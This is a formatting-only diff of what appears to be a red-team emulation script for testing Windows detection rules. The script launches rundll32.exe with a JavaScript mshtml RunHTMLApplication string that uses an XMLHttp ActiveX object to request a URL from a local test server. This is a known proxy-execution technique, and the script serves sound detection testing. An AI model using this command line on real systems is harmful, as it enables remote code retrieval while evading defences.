@@ -13,12 +13,10 @@
 from . import common
 
 PLATFORMS = [common.WINDOWS]
-TRIGGERED_RULES = {
-    "SIEM": [],
-    "ENDPOINT": []
-}
+TRIGGERED_RULES = {"SIEM": [], "ENDPOINT": []}
 TACTICS = []
 RTA_ID = "75687622-2e75-4612-b213-a31f923efdd4"
+
 
 @common.requires_os(PLATFORMS)
 def main():
@@ -27,13 +25,15 @@ def main():
     common.clear_web_cache()
 
     url = "http://%s:%d" % (ip, port)
-    rundll32 = 'rundll32.exe'
+    rundll32 = "rundll32.exe"
     js = """
         'javascript:"\..\mshtml,RunHTMLApplication ";'
         'var%20xhr=new%20ActiveXObject("Msxml2.XMLHttp.6.0");,'
         'xhr.open("GET", "{url}",false);xhr.send();'
-    """.format(url=url)
-    packed_js = ''.join(s.strip() for s in js.splitlines())
+    """.format(
+        url=url
+    )
+    packed_js = "".join(s.strip() for s in js.splitlines())
 
     common.execute([rundll32, packed_js])
     server.shutdown()
